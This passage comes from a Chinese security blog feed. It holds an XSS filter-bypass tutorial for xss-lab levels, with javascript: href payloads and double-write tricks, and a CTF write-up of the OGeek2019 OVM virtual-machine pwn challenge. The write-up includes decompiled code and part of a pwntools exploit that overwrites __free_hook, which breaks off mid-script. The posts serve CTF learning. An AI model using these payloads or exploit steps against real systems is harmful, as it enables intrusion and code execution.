class="headerlink" title="onfocus事件"></a>onfocus事件</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/012bdfc49a3aa8cc5ab09556c096a09d.png" alt="img"></p><p>onfocus事件在元素获得焦点时触发，最常与 <input>、<select> 和 <a> 标签一起使用，以上面图片的html标签<input>为例，<input>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</p><h5 id="onclick-事件"><a href="#onclick-事件" class="headerlink" title="onclick 事件"></a>onclick 事件</h5><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250110225122314.png" alt="image-20250110225122314"></p><h5 id="onmouseover事件"><a href="#onmouseover事件" class="headerlink" title="onmouseover事件"></a>onmouseover事件</h5><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250114002455486.png" alt="image-20250114002455486"></p><h5 id="示例1（xss-lab-level4"><a href="#示例1（xss-lab-level4" class="headerlink" title="示例1（xss_lab_level4)"></a>示例1（xss_lab_level4)</h5><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250110225817043.png" alt="image-20250110225817043"></p><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250110225933209.png" alt="image-20250110225933209"></p><h4 id="类型三：某些敏感字母被替代"><a href="#类型三：某些敏感字母被替代" class="headerlink" title="类型三：某些敏感字母被替代"></a>类型三：某些敏感字母被替代</h4><p>例如onclick被替代为o_nclick</p><p>这个时候如果大小没有过滤，就尝试用大小写绕过，否则就需要闭合标签，构造新的标签</p><h5 id="a标签的href属性"><a href="#a标签的href属性" class="headerlink" title="a标签的href属性"></a>a标签的href属性</h5><p><img src="https://i-blog.csdnimg.cn/blog_migrate/3d76230687597cd12652b56bb2abc570.png" alt="img"></p><p>这个属性的意思是可以当a标签被点击可以时可以跳转到某个网站，也可以执行js代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">payloa</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&gt;&lt;a href=javascript:alert(&#x27;xss&#x27;)&gt;xss&lt;/a&gt;&lt;&quot;</span><br></code></pre></td></tr></table></figure><h5 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h5><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250110234301670.png" alt="image-20250110234301670"></p><h4 id="类型三：某些敏感字符串被删除"><a href="#类型三：某些敏感字符串被删除" class="headerlink" title="类型三：某些敏感字符串被删除"></a>类型三：某些敏感字符串被删除</h4><p>一些疑似代码的字符串被删除，例如script,on，href等等</p><p>这个时候可用双写字符绕过</p><p>例如输入oonn,那么把中间的on删掉，之后就是on,hrhrefef删掉中间的href就是href，从而绕过</p><h4 id="类型4绝大部分字符被过滤替换删除-添加http-白名单"><a href="#类型4绝大部分字符被过滤替换删除-添加http-白名单" class="headerlink" title="类型4绝大部分字符被过滤替换删除&amp;添加http:&#x2F;&#x2F;白名单"></a>类型4绝大部分字符被过滤替换删除&amp;添加http:&#x2F;&#x2F;白名单</h4><p>解决方法一：href属性自带解码功能，可以用unicode编码绕过计算机预定系统</p><p><img src="C:/Users/zhuoh/AppData/Roaming/Typora/typora-user-images/image-20250114192807067.png" alt="image-20250114192807067"></p><p>遇到检查输入的字符串是否存在http:&#x2F;&#x2F;,在payload中构造http:&#x2F;&#x2F;,只需要注释掉即可</p><p>解决方法二</p><p>有些题目可能会把http的referer参数&#x2F;ua头放在前端，这时候可以抓包伪造referer&#x2F;ua的内容为payload进行攻击</p><p>解决方法三</p><p>因为有一些<a>标签的href只允许有http内容的东西通过，这时候可以在payload+注释进行绕过，例如：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">javascript:alert(<span class="hljs-number">1</span>)<span class="hljs-regexp">//</span>http:<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn_vm入门</title>
      <link href="/2024/12/30/pwn-vm%E5%85%A5%E9%97%A8/"/>
      <url>/2024/12/30/pwn-vm%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-vm入门"><a href="#pwn-vm入门" class="headerlink" title="pwn_vm入门"></a>pwn_vm入门</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>首先介绍一下什么是vm_pwn,这东西一般代指在程序中实现运算指令来模拟程序的运行（汇编类）或者在程序中自定义运算指令的程序（编译类），而常见的vmpwn就是这两种题型，而常见的漏洞点是越界读写,下面我们用题目来学习、</p><h2 id="OGeek2019-Final-OVM"><a href="#OGeek2019-Final-OVM" class="headerlink" title="[OGeek2019 Final]OVM"></a>[OGeek2019 Final]OVM</h2><p>先检查一下保护，发现除了canary都开了</p><p><img src="/img/pwn-vm/1"></p><p>程序主体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int16 v4; <span class="hljs-comment">// [rsp+2h] [rbp-Eh] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int16 v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int16 v6; <span class="hljs-comment">// [rsp+6h] [rbp-Ah] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  comment = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x8C</span>uLL);<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>);<br>  signal(<span class="hljs-number">2</span>, signal_handler);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="hljs-number">0x16</span>uLL);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;PC: &quot;</span>, <span class="hljs-number">4uLL</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v5);<br>  getchar();<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;SP: &quot;</span>, <span class="hljs-number">4uLL</span>);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v6);<br>  getchar();<br>  reg[<span class="hljs-number">13</span>] = v6;<br>  reg[<span class="hljs-number">15</span>] = v5;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;CODE SIZE: &quot;</span>, <span class="hljs-number">0xB</span>uLL);<br>  _isoc99_scanf(<span class="hljs-string">&quot;%hd&quot;</span>, &amp;v4);<br>  getchar();<br>  <span class="hljs-keyword">if</span> ( v6 + (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v4 &gt; <span class="hljs-number">0x10000</span> || !v4 )<br>  &#123;<br>    write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXCEPTION\n&quot;</span>, <span class="hljs-number">0xA</span>uLL);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">155</span>);<br>  &#125;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;CODE: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  running = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; v4 &gt; i; ++i )<br>  &#123;<br>    _isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;memory[v5 + i]);<br>    <span class="hljs-keyword">if</span> ( (memory[i + v5] &amp; <span class="hljs-number">0xFF000000</span>) == <span class="hljs-number">-16777216</span> )<br>      memory[i + v5] = <span class="hljs-number">-536870912</span>;<br>    getchar();<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( running )<br>  &#123;<br>    v7 = fetch();<br>    execute(v7);<br>  &#125;<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="hljs-number">0x1B</span>uLL);<br>  read(<span class="hljs-number">0</span>, comment, <span class="hljs-number">0x8C</span>uLL);<br>  sendcomment(comment);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Bye\n&quot;</span>, <span class="hljs-number">4uLL</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>先来介绍一下总体的程序流程，首先要输入PC和SP,对应程序计数器和堆栈指针，这就很明显reg数组模拟的是栈</p><p>接着让用户输入要执行的代码大小，这个大小不能超过0x10000,然后让用户输入执行代码，通过execute函数执行</p><p>执行完代码后往comment存的内容读入数据，这里要注意的是已comment的内容为地址读入，而不是comment本身，然后执行sendcomment函数，这里其实就是执行free函数</p><p>然后我们来看看execute函数的具体内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">execute</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">ssize_t</span> result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+19h] [rbp-7h]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+1Ah] [rbp-6h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v4 = (a1 &amp; <span class="hljs-number">0xF0000</span>u) &gt;&gt; <span class="hljs-number">16</span>;<br>  v3 = (<span class="hljs-type">unsigned</span> __int16)(a1 &amp; <span class="hljs-number">0xF00</span>) &gt;&gt; <span class="hljs-number">8</span>;<br>  v2 = a1 &amp; <span class="hljs-number">0xF</span>;<br>  result = HIBYTE(a1);<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x70</span> )                     <span class="hljs-comment">// 操作码为0x70(112)为加法操作数</span><br>                                                <span class="hljs-comment">// </span><br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = reg[v2] + reg[v3];<br>    <span class="hljs-keyword">return</span> result;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x70</span>u )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xB0</span> )<br>    &#123;<br>      result = (<span class="hljs-type">ssize_t</span>)reg;<br>      reg[v4] = reg[v2] ^ reg[v3];              <span class="hljs-comment">// 异或</span><br>      <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xB0</span>u )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xD0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = (<span class="hljs-type">int</span>)reg[v3] &gt;&gt; reg[v2];      <span class="hljs-comment">// 右移</span><br>        <span class="hljs-keyword">return</span> result;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0xD0</span>u )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xE0</span> )<br>        &#123;<br>          running = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( !reg[<span class="hljs-number">13</span>] )<br>            <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;EXIT\n&quot;</span>, <span class="hljs-number">5uLL</span>);    <span class="hljs-comment">// exit</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) != <span class="hljs-number">0xFF</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> result;<br>        &#125;<br>        running = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;R%d: %X\n&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)i, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)reg[i]);<br>        <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;HALT\n&quot;</span>, <span class="hljs-number">5uLL</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0xC0</span> )<br>      &#123;<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = reg[v3] &lt;&lt; reg[v2];           <span class="hljs-comment">// 左移</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>      &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x90</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] &amp; reg[v3];          <span class="hljs-comment">// 与</span><br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0xA0</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v2] | reg[v3];          <span class="hljs-comment">// 或</span><br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x80</span>u:<br>          result = (<span class="hljs-type">ssize_t</span>)reg;<br>          reg[v4] = reg[v3] - reg[v2];          <span class="hljs-comment">// 减</span><br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x30</span> )<br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;                      <span class="hljs-comment">// load</span><br>    reg[v4] = memory[reg[v2]];<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) &gt; <span class="hljs-number">0x30</span>u )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( HIBYTE(a1) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x50</span>u:                               <span class="hljs-comment">// push</span><br>        LODWORD(result) = reg[<span class="hljs-number">13</span>];<br>        reg[<span class="hljs-number">13</span>] = result + <span class="hljs-number">1</span>;<br>        result = (<span class="hljs-type">int</span>)result;<br>        <span class="hljs-built_in">stack</span>[(<span class="hljs-type">int</span>)result] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x60</span>u:                               <span class="hljs-comment">// pop</span><br>        --reg[<span class="hljs-number">13</span>];<br>        result = (<span class="hljs-type">ssize_t</span>)reg;<br>        reg[v4] = <span class="hljs-built_in">stack</span>[reg[<span class="hljs-number">13</span>]];<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0x40</span>u:                               <span class="hljs-comment">// store</span><br>        result = (<span class="hljs-type">ssize_t</span>)memory;<br>        memory[reg[v2]] = reg[v4];<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x10</span> )                <span class="hljs-comment">// LOAD_IMM</span><br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (<span class="hljs-type">unsigned</span> __int8)a1;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( HIBYTE(a1) == <span class="hljs-number">0x20</span> )                <span class="hljs-comment">// TEST_ZERO</span><br>  &#123;<br>    result = (<span class="hljs-type">ssize_t</span>)reg;<br>    reg[v4] = (_BYTE)a1 == <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>它通过取高位，右移等操作来获取各个操作数，那么我们输入的命令就应该是它的逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">code = (opcode &lt;&lt; <span class="hljs-number">24</span>) + (dest &lt;&lt; <span class="hljs-number">16</span>) + (src1 &lt;&lt; <span class="hljs-number">8</span>) + src2<br></code></pre></td></tr></table></figure><p>这个函数的内容其实就是通过不同的指令，来执行不同的操作，具体逆向成汇编语言就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">mov reg, src2<span class="hljs-number">0x10</span> : reg[dest] = src2<br>mov reg, <span class="hljs-number">0</span><span class="hljs-number">0x20</span> : reg[dest] = <span class="hljs-number">0</span><br>mov mem, reg            <span class="hljs-number">0x30</span> : reg[dest] = memory[reg[src2]]<br>mov reg, mem            <span class="hljs-number">0x40</span> : memory[reg[src2]] = reg[dest]<br>push reg                <span class="hljs-number">0x50</span> : stack[result] = reg[dest]<br>pop reg                 <span class="hljs-number">0x60</span> : reg[dest] = stack[reg[<span class="hljs-number">13</span>]]<br>add                     <span class="hljs-number">0x70</span> : reg[dest] = reg[src2] + reg[src1]<br>sub                     <span class="hljs-number">0x80</span> : reg[dest] = reg[src1] - reg[src2]<br><span class="hljs-keyword">and</span>                     <span class="hljs-number">0x90</span> : reg[dest] = reg[src2] &amp; reg[src1]<br><span class="hljs-keyword">or</span>                      <span class="hljs-number">0xA0</span> : reg[dest] = reg[src2] | reg[src1]<br>^                  <span class="hljs-number">0xB0</span> : reg[dest] = reg[src2] ^ reg[src1]<br>left                    <span class="hljs-number">0xC0</span> : reg[dest] = reg[src1] &lt;&lt; reg[src2]<br>right                   <span class="hljs-number">0xD0</span> : reg[dest] = reg[src1] &gt;&gt; reg[src2]<br>                        <span class="hljs-number">0xFF</span> : (exit <span class="hljs-keyword">or</span> <span class="hljs-built_in">print</span>) <span class="hljs-keyword">if</span>(reg[<span class="hljs-number">13</span>] != <span class="hljs-number">0</span>) <span class="hljs-built_in">print</span> oper<br></code></pre></td></tr></table></figure><p>这个题的漏洞点在于越界访问，具体点是movsxd汇编指令的利用</p><p><img src="/img/pwn-vm/2"></p><p><code>movsxd</code> 是 <strong>Move with Sign-Extend</strong> 的缩写，用于将一个较小的有符号数据扩展为更大的有符号数据。也就是说数组的下标是有符号的，那么我们可以通过输入负数，进行向上的越界访问</p><p>这道题的解题思路是</p><p>1.向上越界泄露libc地址</p><p>2.通过固定偏移得到free_hook的地址</p><p>3.向上越界把free_hook写入comment处</p><p>4.用read把free_hook覆盖成system</p><p>exp如下，每一步的指令都有注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br><span class="hljs-comment"># sh = remote(&quot;node4.buuoj.cn&quot;, 29921)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc=ELF(<span class="hljs-string">&#x27;/home/joker/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]-libc.sym[<span class="hljs-string">&#x27;stderr&#x27;</span>]))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_code</span>(<span class="hljs-params">opcode, dest, src1, src2</span>):<br>    code = (opcode &lt;&lt; <span class="hljs-number">24</span>) + (dest &lt;&lt; <span class="hljs-number">16</span>) + (src1 &lt;&lt; <span class="hljs-number">8</span>) + src2<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(code))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(code)<br><br><span class="hljs-comment"># gdb.attach(sh, &#x27;b *$rebase(0xC4A)&#x27;)</span><br>sh.sendlineafter(<span class="hljs-string">&quot;PC: &quot;</span>, <span class="hljs-string">&#x27;10&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;SP: &quot;</span>, <span class="hljs-string">&#x27;10&#x27;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;CODE SIZE: &quot;</span>, <span class="hljs-string">&quot;24&quot;</span>)<br>sh.recvuntil(<span class="hljs-string">&quot;CODE: &quot;</span>)<br><span class="hljs-comment"># gdb.attach(sh, &#x27;b *$rebase(0x0D4B)&#x27;)</span><br><br><span class="hljs-comment">#send_code(op,dest,src1,src2)</span><br><span class="hljs-comment">#泄露libc高低地址</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">26</span>))   <span class="hljs-comment">#reg[0]=26</span><br>sh.sendline(send_code(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) <span class="hljs-comment">#reg[1]=reg[1]-reg[0]=0-26</span><br>sh.sendline(send_code(<span class="hljs-number">0x30</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) <span class="hljs-comment">#reg[2]=memory[reg[1]]  stdeer_low_addr</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>)) <span class="hljs-comment">#reg[0]=25</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)) <span class="hljs-comment">#reg[1]=0</span><br>sh.sendline(send_code(<span class="hljs-number">0x80</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)) <span class="hljs-comment">#reg[1]=reg[1]-reg[0]=0-25</span><br>sh.sendline(send_code(<span class="hljs-number">0x30</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>))    <span class="hljs-comment">#reg[3]=memory[reg[1]]  stdeer_high_addr</span><br><br><br><span class="hljs-comment">#print(hex(libc.sym[&#x27;__free_hook&#x27;]-libc.sym[&#x27;stderr&#x27;]))</span><br><span class="hljs-comment">#offest=0x10a8</span><br>sh.sendline(send_code(<span class="hljs-number">0x10</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>))  <span class="hljs-comment">#reg[4]=0x10</span><br>sh.sendline(send_code(<span 